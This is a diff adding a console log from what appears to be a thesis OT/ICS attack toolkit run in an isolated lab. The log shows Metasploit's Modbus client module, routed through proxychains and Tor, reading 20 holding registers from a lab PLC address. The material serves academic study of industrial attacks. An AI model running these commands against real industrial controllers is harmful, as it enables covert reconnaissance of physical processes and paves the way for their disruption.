@@ -1,0 +1,40 @@
+======================================================================
+  TFM - TOOLKIT DE ATAQUES OT/ICS (laboratorio local aislado)
+  Modbus - Lectura de Holding Registers (READ_REGISTERS)
+======================================================================
+  Fecha      : 2026-10-09 22:12:56
+  Objetivo   : 192.168.10.10:502 (addr=0)
+  MITRE ICS  : T0861
+======================================================================
+$ proxychains msfconsole -q -r /ataques/resource_scripts/modbusclient_read_registers.rc
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+[*] Processing /ataques/resource_scripts/modbusclient_read_registers.rc for ERB directives.
+resource (/ataques/resource_scripts/modbusclient_read_registers.rc)> use auxiliary/scanner/scada/modbusclient
+[*] Setting default action READ_HOLDING_REGISTERS - view all 9 actions with the show actions command
+resource (/ataques/resource_scripts/modbusclient_read_registers.rc)> set RHOSTS 192.168.10.10
+RHOSTS => 192.168.10.10
+resource (/ataques/resource_scripts/modbusclient_read_registers.rc)> set RPORT 502
+RPORT => 502
+resource (/ataques/resource_scripts/modbusclient_read_registers.rc)> set UNIT_NUMBER 1
+UNIT_NUMBER => 1
+resource (/ataques/resource_scripts/modbusclient_read_registers.rc)> set ACTION READ_REGISTERS
+ACTION => READ_REGISTERS
+resource (/ataques/resource_scripts/modbusclient_read_registers.rc)> set DATA_ADDRESS 0
+DATA_ADDRESS => 0
+resource (/ataques/resource_scripts/modbusclient_read_registers.rc)> set NUMBER 20
+NUMBER => 20
+resource (/ataques/resource_scripts/modbusclient_read_registers.rc)> run
+[*] Running module against 192.168.10.10
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.168.10.10:502  ...  OK
+[*] 192.168.10.10:502 - Sending READ HOLDING REGISTERS...
+[+] 192.168.10.10:502 - 20 register values from address 0 : 
+[+] 192.168.10.10:502 - [21, 84, 24, 7, 42, 102, 108, 202, 52, 42, 20, 980, 752, 17, 12, 1402, 0, 17, 5557, 275]
+[*] Auxiliary module execution completed
+resource (/ataques/resource_scripts/modbusclient_read_registers.rc)> exit
+[=] Código de salida: 0
